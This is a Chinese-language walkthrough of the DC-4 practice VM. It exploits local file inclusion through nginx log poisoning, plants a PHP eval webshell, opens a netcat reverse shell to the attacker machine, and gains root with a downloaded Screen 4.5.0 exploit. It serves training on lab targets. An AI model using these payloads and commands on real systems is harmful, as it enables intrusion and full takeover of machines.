
# 0x00环境

攻击机：kali（192.168.1.28）

靶机：DC-4（192.168.1.13）


# 0x01实战


## 端口扫描

```
nmap -sV -A -p- 192.168.1.13
```

![image-20220111145130914.png](../../_img\06-靶场实践/1652256425733-57ef87bc-e21c-43c6-b83e-380936cec577.png)

开放了80端口HTTP服务


## 目录扫描

![image-20220111145325177.png](../../_img\06-靶场实践/1652256433512-75de8e9d-7b49-4793-bb94-612948f3f679.png)

找到一个特殊的页面footer.php内容会随着页面刷新而改变

![image-20220111145505984.png](../../_img\06-靶场实践/1652256437596-7bc83e99-b9f4-41d0-8702-43269fd3f11e.png)

![image-20220111145513169.png](../../_img\06-靶场实践/1652256440467-d0f2e0c2-ab29-4542-b257-ec803bbfc953.png)


## 漏洞发现

在浏览80端口HTTP服务的时候发现在Contact页面留言提交后显示的页面底部内容会随着页面的刷新而改变

![image-20220111145734632.png](../../_img\06-靶场实践/1652256443937-93531657-d2f7-4a90-85bb-e2b3cd967332.png)

![image-20220111145750479.png](../../_img\06-靶场实践/1652256447546-91dfc7f0-3411-4a6d-bcfe-0bb870988201.png)

这种情况与我们前面发现的footer.php页面相同，想到可能是hankyou.php页面包含了footer.php页面，存在文件包含漏洞

访问/etc/passwd文件测试是否存在文件包含漏洞

![image-20220111150248872.png](../../_img\06-靶场实践/1652256451650-aa002bfb-6b9d-4a37-b9e5-9bfda52321d8.png)

存在文件包含漏洞


## 漏洞利用

通过前面的端口扫描我们可以知道靶机的环境是使用nginx搭建的，而nginx在网站上的每一步操作都将会被写入日志文件log(/var/log/nginx/access.log)内，因此我们可以通过log来拿 shell

使用burpsuite抓包修改请求，写入phpinfo()测试是否可以包含成功

![image-20220111151336326.png](../../_img\06-靶场实践/1652256455801-7c57aaee-b94f-46cd-b1ec-1edd4243f957.png)

成功

![image-20220111151619526.png](../../_img\06-靶场实践/1652256459471-da82337b-f449-4e78-9541-194326d6bda2.png)

上传一句话木马

```
<?php @eval($_POST['XMTX']);?>
```

![image-20220111153318647.png](../../_img\06-靶场实践/1652256463083-d12e17a2-9ef4-4e59-84b8-3b2b53bb5aaa.png)

使用蚁剑链接

![image-20220111153522272.png](../../_img\06-靶场实践/1652256466733-d3443dc5-fa4c-443b-b7d8-be675fb96862.png)


## 反弹shell

创建监听

```
nc -vnlp 4444
```

![image-20220111153832261.png](../../_img\06-靶场实践/1652256471287-7b6f529c-54fd-42dd-9f76-057ce1883dcd.png)

使用nc反弹shell到攻击机

```
nc 192.168.1.28 4444 -e /bin/bash
```

![image-20220111153927518.png](../../_img\06-靶场实践/1652256474597-7198f713-9f6d-4ff5-904e-23c32ee6f62b.png)

成功反弹shell

![image-20220111154045297.png](../../_img\06-靶场实践/1652256477935-2b9c9986-02f8-4cfe-a8a0-2214daf91c40.png)

查找具有root权限的命令

```
find / -perm -u=s -type f 2>/dev/null
```

![image-20220111154138860.png](../../_img\06-靶场实践/1652256481763-69566178-3f58-4984-ad53-9e5bff5ce1f5.png)

可以看到存在screen 4.5.0，在互漏洞库中找到[Screen 4.5.0 存在本地权限提升漏洞](https://www.exploit-db.com/exploits/41154)

![image-20220111154558491.png](../../_img\06-靶场实践/1652256485066-81eed817-acd5-4d21-98db-858209567dd8.png)


## 提权

**说明：在这一部分网上的很多教程都是使用kali上的提权脚本，然后说脚本有问题将提权脚本拆分为三份进行提权，DC官网也是说脚本有问题，千篇一律。在这里我是使用 **[**https://www.exploit-db.com**](https://www.exploit-db.com)** 上的提权脚本，并没有什么问题。之后我对比两个脚本，内容都是一样的，我又搭建新靶场使用kali上的提权脚本也能成功提权。凡事要多思考，照着别人的步骤来对自己有什么提升呢？**

将脚本文件下载到攻击机，通过vi查看发现格式为windows的dos格式<br />![image-20220111162250058.png](../../_img\06-靶场实践/1652256562234-b97309dd-3030-4596-a4f4-9ce4191bc5bf.png)


将脚本文件转换为linux格式
```
dos2unix 41154.sh
```
![image-20220111162330818.png](../../_img\06-靶场实践/1652256566052-4d1af8c0-b1c7-4446-a294-31ca77b29e31.png)

攻击机开启HTTP服务
```
python3 -m http.server
```
![image-20220111160846214.png](../../_img\06-靶场实践/1652256489619-cba09f93-8139-4f81-a509-90b2b3695f47.png)


下载脚本到靶机的tmp目录下（因为tmp权限为777）（也可以使用前面的蚁剑上传提权脚本）
```
wget http://192.168.1.28:8000/41154.sh
```
![image-20220111161013441.png](../../_img\06-靶场实践/1652256538282-13be2f18-b8c7-44af-8abe-fe5a54b6fb29.png)


赋予脚本执行权限并执行，成功得到root权限<br />![image-20220111162553225.png](../../_img\06-靶场实践/1652256568936-b35f4e40-17b9-47ff-a693-49efe2bdcadb.png)


## final-flag

在root根目录下找到flag文件

![image-20220111162705093.png](../../_img\06-靶场实践/1652256574804-5a21f992-a662-4576-8cad-cb565482766b.png)
